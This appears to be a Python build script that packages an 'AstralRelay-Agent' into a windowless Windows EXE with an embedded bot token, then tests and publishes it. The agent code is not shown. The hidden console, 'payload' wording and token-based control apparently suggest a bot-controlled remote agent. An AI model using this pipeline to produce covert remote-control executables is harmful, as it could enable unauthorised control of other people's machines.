# EXE build pipeline for dist/AstralRelay-Agent.exe.
# Flow: validate token and default config before work, create an isolated
# staging package copy under build-tmp/, generate _embedded_payload.py
# only inside that staged copy, run PyInstaller --onefile --noconsole,
# verify size/PE subsystem/smoke, then atomically publish into dist/.
# A complete per-token rebuild is expected; no overlay appending is used.
# Failures keep the previous valid output. Cleanup is attempted on all
# paths, but Windows journaling/SSD wear/AV quarantine prevent any
# forensic-erasure guarantee. Build logs are redacted.
# Ported from src/builder/build-agent.js pipeline semantics.

from __future__ import annotations

import atexit
import datetime
import os
import random
import shutil
import signal
import string
import subprocess
import sys
import time
from pathlib import Path

from astral_relay.agent.payload import is_plausible_bot_token
from astral_relay.agent.secure_input import InterruptedError, prompt_for_token
from astral_relay.builder.payload_codegen import render_payload_module
from astral_relay.builder.subsystem import set_gui_subsystem
from astral_relay.builder.verification import check_gui_subsystem, check_size, self_test, smoke_test
from astral_relay.shared.config import default_runtime_config
from astral_relay.shared.errors import BuildError
from astral_relay.shared.logging_utils import error, info, redact

ROOT = Path(__file__).resolve().parent.parent.parent.parent
DIST_DIR = ROOT / "dist"
OUTPUT_EXE = DIST_DIR / "AstralRelay-Agent.exe"
BUILD_TMP = ROOT / "build-tmp"
SRC_PACKAGE = ROOT / "src" / "astral_relay"

_TRACKED_STAGING: list[Path] = []


def _track(path: Path) -> Path:
    _TRACKED_STAGING.append(path)
    return path


def _cleanup_tracked() -> None:
    while _TRACKED_STAGING:
        path = _TRACKED_STAGING.pop()
        shutil.rmtree(path, ignore_errors=True)


atexit.register(_cleanup_tracked)


def prompt_build_token() -> str:
    """Secure build-time token prompt. Masked input, empty rejected."""
    return prompt_for_token()


def resolve_build_token(token=None, prompt_token=None) -> str:
    """Resolve the build token from an argument or secure prompt, validated first."""
    prompt = prompt_token if prompt_token is not None else prompt_build_token
    live = token if token is not None else prompt()
    if not is_plausible_bot_token(live):
        raise BuildError("Token rejected: expected bot token shape (three dot-separated parts).")
    return live.strip()


def _stage_package() -> Path:
    """Copy the required package files into an isolated staging tree."""
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    stage = _track(BUILD_TMP / f"relay-build-{os.getpid()}-{suffix}")
    dest = stage / "pkg" / "astral_relay"
    ignore = shutil.ignore_patterns("__pycache__", "*.pyc", "tests", "_embedded_payload.py")
    shutil.copytree(SRC_PACKAGE, dest, ignore=ignore)
    (stage / "pkg" / "run_agent.py").write_text(
        "from astral_relay.agent.app import entry\n\nif __name__ == '__main__':\n    entry()\n",
        encoding="utf-8",
    )
    return stage


_current_child = None


def _on_signal(signum, frame) -> None:  # noqa: ANN001, ANN202
    """Abort an in-progress build on Ctrl+C / termination.

    Cleans staging, kills the packager child so no orphan keeps
    running, then raises KeyboardInterrupt so blocking waits unwind.
    Only the build stops; the menu loop catches it and redraws.
    """
    _cleanup_tracked()
    child = _current_child
    if child is not None:
        try:
            child.kill()
        except OSError:
            pass
    raise KeyboardInterrupt()


def _run_pyinstaller(stage: Path, log_lines: list) -> Path:
    """Run PyInstaller into the staging dist dir. Returns the produced EXE path."""
    out_dir = stage / "dist"
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--name", "AstralRelay-Agent",
        "--distpath", str(out_dir),
        "--workpath", str(stage / "work"),
        "--specpath", str(stage),
        "--paths", str(stage / "pkg"),
        str(stage / "pkg" / "run_agent.py"),
    ]
    global _current_child
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, encoding="utf-8", errors="replace",
                                shell=False, cwd=str(ROOT))
    except OSError as exc:
        raise BuildError(f"Packager failed to start: {exc}") from exc
    try:
        _current_child = proc
        out, err = proc.communicate(timeout=3600)
    except subprocess.TimeoutExpired as exc:
        try:
            proc.kill()
        except OSError:
            pass
        raise BuildError(f"Packager timed out: {exc}") from exc
    except (OSError, subprocess.SubprocessError) as exc:
        raise BuildError(f"Packager failed: {exc}") from exc
    finally:
        _current_child = None
    log_lines.append(str(redact(out or "")))
    log_lines.append(str(redact(err or "")))
    if proc.returncode != 0:
        raise BuildError(f"Packager exited with code {proc.returncode}. See dist build log.")
    produced = out_dir / "AstralRelay-Agent.exe"
    if not produced.is_file():
        raise BuildError("Packager finished without producing the expected EXE.")
    return produced


def _stage_log_path() -> Path:
    stamp = datetime.datetime.now(datetime.timezone.utc).isoformat().replace(":", "-")
    return DIST_DIR / f"build-py-{stamp}.log"


def build_agent(token=None, prompt_token=None, on_stage=None) -> dict:
    """Generate the EXE with an embedded token plus default non-secret config."""
    staged_config = default_runtime_config()
    DIST_DIR.mkdir(parents=True, exist_ok=True)
    BUILD_TMP.mkdir(parents=True, exist_ok=True)
    log_lines: list[str] = []

    def log(text: str) -> None:
        log_lines.append(str(redact(str(text))))
        if on_stage is not None:
            try:
                on_stage(str(text))
            except Exception:
                pass

    log_path = _stage_log_path()

    old_handlers = {}
    for signame in ("SIGINT", "SIGTERM"):
        try:
            old_handlers[signame] = signal.getsignal(getattr(signal, signame))
            signal.signal(getattr(signal, signame), _on_signal)
        except (OSError, ValueError, AttributeError):
            pass
    try:
        live_token = resolve_build_token(token, prompt_token)
        log(f"Generating AstralRelay-Agent v{staged_config['agentVersion']} for win-x64 PyInstaller onefile.")
        stage = _stage_package()
        try:
            log("Preparing template")
            module_source = render_payload_module(live_token, staged_config)
            (stage / "pkg" / "astral_relay" / "_embedded_payload.py").write_text(module_source, encoding="utf-8")
            try:
                os.chmod(stage / "pkg" / "astral_relay" / "_embedded_payload.py", 0o600)
            except OSError:
                pass
            log("Packaging")
            temp_exe = DIST_DIR / f".agent-tmp-{os.getpid()}.exe"
            produced = _run_pyinstaller(stage, log_lines)
            log("Embedding payload")
            shutil.copy2(produced, temp_exe)
            check_size(str(temp_exe))
            try:
                set_gui_subsystem(str(temp_exe))
            except ValueError:
                pass
            check_gui_subsystem(str(temp_exe))
            version_line = smoke_test(str(temp_exe))
            log(f"Smoke test passed: {version_line}")
            report = self_test(str(temp_exe))
            if report["returncode"] != 0:
                raise BuildError(f"Self-test failed with exit code {report['returncode']}.")
            log("Verifying output")
            _publish_with_retry(temp_exe, OUTPUT_EXE, log)
            log(f"Payload embedded and verified: {version_line}")
            info(f"Build done: {OUTPUT_EXE}")
            return {"exe_path": str(OUTPUT_EXE), "version_line": version_line}
        finally:
            _cleanup_tracked()
    except InterruptedError:
        raise
    except BuildError:
        error("Build failed.")
        raise
    except Exception as exc:  # noqa: BLE001 - wrapped as user-safe BuildError
        error("Build failed.", {"message": str(exc)})
        raise BuildError(str(exc)) from exc
    finally:
        for signame, handler in old_handlers.items():
            try:
                signal.signal(getattr(signal, signame), handler)
            except (OSError, ValueError, AttributeError):
                pass
        try:
            log_path.write_text("\n".join(log_lines) + "\n", encoding="utf-8")
        except OSError:
            pass
        _cleanup_tracked()


def _publish_with_retry(temp_exe: Path, output_exe: Path, log) -> None:
    """Atomically publish the verified output, retrying Windows file locks.

    After a few failed attempts the running agent holding the file is
    terminated once (never this process), then retries continue.
    """
    from astral_relay.agent.startup import terminate_holders

    last: Exception | None = None
    for attempt in range(1, 31):
        try:
            if output_exe.exists():
                try:
                    output_exe.unlink()
                except OSError as exc:
                    raise exc
            os.replace(temp_exe, output_exe)
            try:
                temp_exe.unlink(missing_ok=True)
            except OSError:
                pass
            return
        except OSError as exc:
            last = exc
            if attempt == 3:
                try:
                    killed = terminate_holders(str(output_exe))
                    log(f"Stopped {killed} running agent(s) holding the output file.")
                except Exception:
                    pass
            else:
                log(f"Publishing locked (attempt {attempt}/30), retrying.")
            time.sleep(2)
    hint = ""
    if last is not None and "permission" in str(last).lower():
        hint = " If the Agent is still running, stop it first: a running EXE locks its own file."
    raise BuildError(f"Publishing failed after retries: {last}.{hint}")


def archive_stale_output(exe_path=None):
    """Rename stale output aside before a rebuild. Returns the backup path or None."""
    target = Path(exe_path) if exe_path is not None else OUTPUT_EXE
    try:
        target.stat()
    except OSError:
        return None
    backup = target.parent / f"{target.name}.stale-{int(time.time() * 1000)}"
    os.replace(target, backup)
    return str(backup)
